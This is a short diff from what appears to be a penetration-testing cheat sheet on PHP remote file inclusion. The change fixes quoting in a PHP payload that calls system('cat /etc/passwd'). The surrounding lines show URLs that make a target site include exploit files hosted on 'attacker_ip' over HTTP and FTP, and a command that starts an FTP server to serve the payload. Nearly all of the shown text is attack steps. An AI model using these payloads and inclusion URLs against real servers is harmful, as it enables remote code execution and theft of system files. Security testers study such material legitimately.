@@ -16,7 +16,7 @@ Include exploit file for RCE: `http://server/site.php?file=http://attacker_ip/ex
 Setup a FTP server with exploit.php on attacking machine, and try to include it with FTP protocol.
 
 ```php
-<?php echo system("cat /etc/passwd); ?>
+<?php echo system("cat /etc/passwd"); ?>
 ```
 Start FTP server with: `python -m pyftpdlib -p 21`  
 Include remote 'exploit.php': `http://server/site.php?file=ftp://attacker_ip/exploit.php`
